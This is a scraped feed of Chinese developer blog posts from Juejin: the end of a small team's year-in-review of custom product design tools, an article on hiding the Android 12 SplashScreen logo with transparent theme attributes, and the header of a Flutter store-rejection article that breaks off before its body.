<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd36431c733b4d1795af8b3cdd6fc3f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=XDJJCB84xkri2xM%2BaHrM8L11GXA%3D" alt="3.gif" loading="lazy"/></p>
<p>当然，也支持3D的预览，不同面进行设计后进行3D渲染。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/925c540208144b2384cd44996c9403b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=amlqa2ZP%2BiHvpsRy7plIM%2BjpFuw%3D" alt="4.gif" loading="lazy"/></p>
<h2 data-id="heading-1">丝巾设计平台</h2>
<p>这个平台是帮甲方开发的项目，主要的功能是实现各种印刷图案特效，让用户快速的实现丝巾设计，并且实现丝巾试戴效果。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e06142a51c864064b5635aa4d95f78c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=I6PTClYGA%2Fi7Mo4iDnijIdHRBR4%3D" alt="5.gif" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/200417e281b64cb389abae04fa663bbf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=lxDj1rrwQuuXXVaR1bR75T6n7y4%3D" alt="7.gif" loading="lazy"/></p>
<p>丝巾试戴效果
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a8b4238494249a6bf15cdc71f395cfd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=oHIoq7ThIWbY%2Fy85ygX1bHad7BY%3D" alt="8.gif" loading="lazy"/></p>
<p>当然，也有一些常见的AI设计功能，和图片处理相关的功能。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e9d816dae374c8a91b6dd35cade9d03~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=Qeom%2FgbZSPS63yjqXKEKiLYTrco%3D" alt="9.gif" loading="lazy"/></p>
<h2 data-id="heading-2">吧唧/亚克力设计</h2>
<p>这个项目我们从头开发了一套定制商城小程序，可以让用户在小程序中快速定制吧唧/亚克力钥匙扣产品，<strong>后端是Node.js + MySql的技术栈</strong>，微信支付等各种功能，<strong>Node.js还是经得起考验的</strong>。</p>
<p>这个项目对我们来说有几个重点</p>
<ol>
<li>小程序商城，支持SKU、阶梯价、物流、折扣、限购、支付等功能。</li>
<li>样机预览，白墨、烫金各种印刷工艺。</li>
<li>打印文件，要有打印机识别的专色通道和拼版功能。</li>
<li>自动刀线，自动根据图片生成刀线文件。</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/699016bf4d014f278f5106531d46fe17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=UARxGMRRj81Q%2BR7zv67YsYcaSNE%3D" alt="Foxmail20260105023542.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f9229935bcb428ebc48ab8da1cffc4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=2MAkHyrj87WwJji626CfMaXvTd4%3D" alt="508880516-fbad98cb-24ff-431d-b4b7-314a4e1360e3.jpg" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61edc4fdeba845cf94c8a1b71e0c89fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=WZYVAsXv8ZTwaMTn8TrT7qsUL9A%3D" alt="20.gif" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87394c039af2437a9b43eb7e8f95fa79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=VLJhlF%2FTpsv5Br%2FBeztaxsNYvQ4%3D" alt="21.gif" loading="lazy"/></p>
<h2 data-id="heading-3">印花设计</h2>
<p>这个项目主要是让用户根据一张图片快速的生成瓷砖、面料相关的印花，快速实现印花效果，然后渲染到3D模型中，进行预览，确认效果后可以下载连续四方图用于印刷。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22f84a486fbb4da3960bdf9254afa7f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=0TWoPBo6UErSFwWh4ksJviADIPs%3D" alt="12.gif" loading="lazy"/></p>
<h2 data-id="heading-4">盒型/刀版设计</h2>
<p>这个项目主要的功能是让客户根据现有的盒型，快速的修改长宽高后，生成新的刀版图和3D模型，用于快速的预览，需要实现平面刀版图和3D模型的参数化，来试实现参数调整后实时渲染的功能。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f49a7a17ca041ca8176ea15e420930c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=pB2jMKw8oxYrjNH8f%2F3WAOyBrNU%3D" alt="13.gif" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69688b9d44fb41cebbadae89ebee39ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=NZpYW6J2keRzu0ykaakaM0M9K1s%3D" alt="dd0184b8-77fe-477b-bf07-49271c70be47.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a35d2fcab6f8444fbd29eff25122d025~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=BUBvhdQurEU8F%2BvoNb98e4embyM%3D" alt="14.gif" loading="lazy"/></p>
<h2 data-id="heading-5">工艺仿真</h2>
<p>这一部分其实是调研的内容，主要是用3D来实现工艺仿真的效果，比如凹凸压痕、不同烫金材质，难度不大，不过涉及的细节比较多。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0572ba85d534974ab0372a9ed39a2ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=W4PbfPGmsiACehgSUJs9AwrxSyM%3D" alt="19_1766385962.gif" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e41331db2654c508f041b4f190dfab8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=YcVTpRPBv2nZTR6MggCJ9TINSNc%3D" alt="20_1766385966.gif" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eed7d9689c8b4ca19ccd85ac8ac6ec41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=tBypZNXu%2F696jYivfUQXeIWku6M%3D" alt="20260105-155711.gif" loading="lazy"/></p>
<h2 data-id="heading-6">回顾</h2>
<p>这一年我们去杭州3次，在义乌待了2个月，回忆起来还历历在目为，有艰辛、有收获、有成长，<strong>最感激的是找到了志同道合的兄弟</strong>。</p>
<ol>
<li>新招实习生不出差，自己到客户现场开发。</li>
<li>钱塘江畔驻场开发，与韩国客户用翻译软件面聊。</li>
<li>连续3天联系中介解决团队住宿问题。</li>
<li>解决白墨专色，夜里在义乌杨村满大街找打印机。</li>
<li>解决色差问题对比到眼睛看花，国庆加班赶进度。</li>
<li>找到志同道合的兄弟，多个项目一起跑下来。</li>
</ol>
<p>日夜兼程</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25bcb4187caa4bf3a8201cc32498c881~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=2N%2BhtutG%2Bh13XghCmGzj%2BjKFILU%3D" alt="Foxmail20260105045116.png" loading="lazy"/></p>
<p>驻场开发</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce276ab07cdf44feba501586bce0802e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=NFeLPIIUODh7Yf8bLh3afFpJgWA%3D" alt="Foxmail20260105045128.png" loading="lazy"/></p>
<p>驻扎工厂</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd363a29bc874949aaaec8be79073a5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=r3yW9qD3K4jrGLVPvGgq3tVXo2E%3D" alt="Foxmail20260105050020.png" loading="lazy"/></p>
<p>采购电脑和午休床</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d841c9d50c743f4852f9e2a4aff8c37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=LjBq0oUPqXUk0XVg2HOGIb7FnL8%3D" alt="Foxmail20260105045657.png" loading="lazy"/></p>
<p>随着同事的加入，我们内部流程也更加规范，需求文档、技术方案、测试用例等等，自卖自夸一下 哈哈，<strong>团队虽小，小巧精悍</strong>，我们完全聚焦在编辑器、定制设计器领域，很多工厂项目让我们积累了宝贵的业务经验。</p>
<h2 data-id="heading-7">总结</h2>
<p>现在AI时代，大家都在唱衰前端，我们最近一年发现<strong>真的扎到场景和业务中，前端开发的机会还是挺大的</strong>，<strong>很多复杂的繁重的专业软件正在被慢慢解构，变成轻量的、简洁的在线软件</strong>，希望明年我们能啃下来更多有难度的项目，结合制造业，服务好更多客户，也祝福大家越来越好，找到自己热爱的事业。</p>
<p>大家感兴趣的可以点个赞和关注，持续向大家汇报进展。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android 12 SplashScreen 一种另类的适配方案]]></title>    <link>https://juejin.cn/post/7591348605867343907</link>    <guid>https://juejin.cn/post/7591348605867343907</guid>    <pubDate>2026-01-05T05:10:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591348605867343907" data-draft-id="7591413526708518912" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android 12 SplashScreen 一种另类的适配方案"/> <meta itemprop="keywords" content="Android,GitHub"/> <meta itemprop="datePublished" content="2026-01-05T05:10:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Android轮子哥"/> <meta itemprop="url" content="https://juejin.cn/user/712139265815144"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android 12 SplashScreen 一种另类的适配方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139265815144/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Android轮子哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-05T05:10:11.000Z" title="Mon Jan 05 2026 05:10:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">问题背景</h4>
<ul>
<li>某天公司产品找到我，问我某些机型上面打开后闪屏页会出现 App 的 Logo</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbeb8ab7fc9049bb86a230c2b2b6e9fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768194734&amp;x-signature=qDGVlmKmznXA7kwr8UIlhB4jDbc%3D" alt="" loading="lazy"/></p>
<ul>
<li>上面说太丑了，有没有办法去掉这个闪屏页的 App Logo 呢？</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c1ed6edac22484cb3b0844d7d3bd71a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768194734&amp;x-signature=mj7sJLffI7UKiFBip1aTGm%2FkB%2FU%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-1">解决方案</h4>
<ul>
<li>
<p>可以确定的是这个问题是 Android 12 的 SplashScreen 特性，几乎找遍了所有的适配文章和官方文档，这些文章或者文档无一例外，都是教你怎么适配 Android 12 的 SplashScreen 特性，并没有说怎么去除 SplashScreen 特性自带的图标，我自己也尝试调用相关 api 测试是否能去除，结果一无所获。</p>
</li>
<li>
<p>问题正处于一筹莫展的时候，我脑子突然有了一个大胆的想法，既然没办法干掉它，就想办法把它隐藏起来总可以了吧？</p>
</li>
<li>
<p>说干就干，于是我找到闪屏页的主题，并加入以下属性：</p>
</li>
</ul>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 闪屏页主题样式 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"SplashTheme"</span> <span class="hljs-attr">parent</span>=<span class="hljs-string">"FullScreenTheme"</span>&gt;</span><span class="xml">
    ......
    <span class="hljs-comment">&lt;!-- 适配 Android 12 SplashScreen 特性  --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowSplashScreenBackground"</span> <span class="hljs-attr">tools:targetApi</span>=<span class="hljs-string">"31"</span>&gt;</span>@color/transparent<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowSplashScreenIconBackgroundColor"</span> <span class="hljs-attr">tools:targetApi</span>=<span class="hljs-string">"31"</span>&gt;</span>@color/transparent<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowSplashScreenAnimatedIcon"</span> <span class="hljs-attr">tools:targetApi</span>=<span class="hljs-string">"31"</span>&gt;</span>@color/transparent<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowSplashScreenBrandingImage"</span> <span class="hljs-attr">tools:targetApi</span>=<span class="hljs-string">"31"</span>&gt;</span>@color/transparent<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<ul>
<li>
<p>有人会说，这几个属性是 Android 12 才有的属性，你加个 <code>tools:targetApi="31"</code> 来抑制警告在低版本下面真的没有问题吗？我非常确定来回答没有问题，因为系统读取 App 主题的时候，是通过读取 xml 文件来获取属性的，在这种情况下，低版本并不会去读取高版本的属性，因为它压根不知道有这几个属性，所以不会有任何问题，经过验证也确实如此。</p>
</li>
<li>
<p>废话不多说，来看看加上这几个属性之后的效果吧，上图：</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/645fb7ca9632412f8473fb02dfb80715~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768194734&amp;x-signature=6qjlEHxQAOoD3vDQ5jQrC2VYmhU%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>成功解决问题，你看看解决这个问题的方法并没有多难，一个脑筋急转弯而已，解决难题的方式总是那么朴实无华。</p>
</li>
<li>
<p>截止目前，我是行业第一个也是唯一一个解决此问题并将解决方案开源出来的人，当然我的粉丝们都提前知道了，在前一阵更新了 AndroidProject（App 架构 + App 模板），同时也将这个优秀的技术方案纳入到这个项目中，但实际这个项目有很多优秀的技术方案并没有写成文章，你如果感兴趣，可以通过阅读源码来知晓：</p>
<ul>
<li>
<p>Java 版本：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FgetActivity%2FAndroidProject" target="_blank" title="https://github.com/getActivity/AndroidProject" ref="nofollow noopener noreferrer">AndroidProject</a></p>
</li>
<li>
<p>Kotlin 版本：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FgetActivity%2FAndroidProject-Kotlin" target="_blank" title="https://github.com/getActivity/AndroidProject-Kotlin" ref="nofollow noopener noreferrer">AndroidProject-Kotlin</a></p>
</li>
</ul>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter 3.38.1 之后，因为某些框架低级错误导致提交 Store 被拒]]></title>    <link>https://juejin.cn/post/7591350620189360134</link>    <guid>https://juejin.cn/post/7591350620189360134</guid>    <pubDate>2026-01-05T01:24:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591350620189360134" data-draft-id="7591334602427695167" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter 3.38.1 之后，因为某些框架低级错误导致提交 Store 被拒"/> <meta itemprop="keywords" content="前端,Flutter,Android"/> <meta itemprop="datePublished" content="2026-01-05T01:24:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="恋猫de小郭"/> <meta itemprop="url" content="https://juejin.cn/user/817692379985752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter 3.38.1 之后，因为某些框架低级错误导致提交 Store 被拒
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/817692379985752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    恋猫de小郭
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-05T01:24:20.000Z" title="Mon Jan 05 2026 01:24:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
